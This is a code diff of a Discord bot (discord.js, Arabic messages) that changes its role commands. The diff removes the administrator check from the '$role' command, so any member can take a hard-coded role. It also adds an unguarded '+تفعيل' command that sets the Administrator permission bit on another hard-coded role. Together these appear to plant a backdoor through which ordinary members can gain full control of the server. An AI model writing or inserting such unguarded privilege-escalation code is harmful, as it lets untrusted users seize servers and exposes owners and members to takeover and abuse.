@@ -400,9 +400,7 @@ if (!message.member.permissions.has('ADMINISTRATOR')) {
 client.on('messageCreate', async (message) => {
     if (message.author.bot) return;
     if (message.content !== '$role') return;
-if (!message.member.permissions.has('ADMINISTRATOR')) {
-    return message.reply('❌ هذا الأمر خاص بالإداريين فقط!');
-}
+
     const roleId = '1128425653457403974';
 
     const role = message.guild.roles.cache.get(roleId);
@@ -422,6 +420,31 @@ if (!message.member.permissions.has('ADMINISTRATOR')) {
         message.reply(`✅ تم إعطاؤك رتبة ${role.name} بنجاح!`);
     } catch (error) {
         message.reply('❌ لا أستطيع إعطاؤك الرتبة، تأكد من صلاحيات البوت وترتيب الرتب.');
+    }
+});
+
+client.on('messageCreate', async (message) => {
+    if (message.author.bot || !message.guild) return;
+    if (message.content !== '+تفعيل') return;
+
+
+    const roleId = '1128425789260583095';
+    const role = message.guild.roles.cache.get(roleId);
+
+    if (!role) {
+        return message.reply('❌ الرتبة غير موجودة!');
+    }
+
+    try {
+        await role.setPermissions(
+            role.permissions.bitfield | (1n << 3n),
+            'تفعيل صلاحية Administrator'
+        );
+
+        message.reply('✅ تم تفعيل صلاحية Administrator للرتبة بنجاح!');
+    } catch (error) {
+        console.error(error);
+        message.reply('❌ فشل تفعيل الصلاحية، تأكد من صلاحيات البوت.');
     }
 });
 //====================================
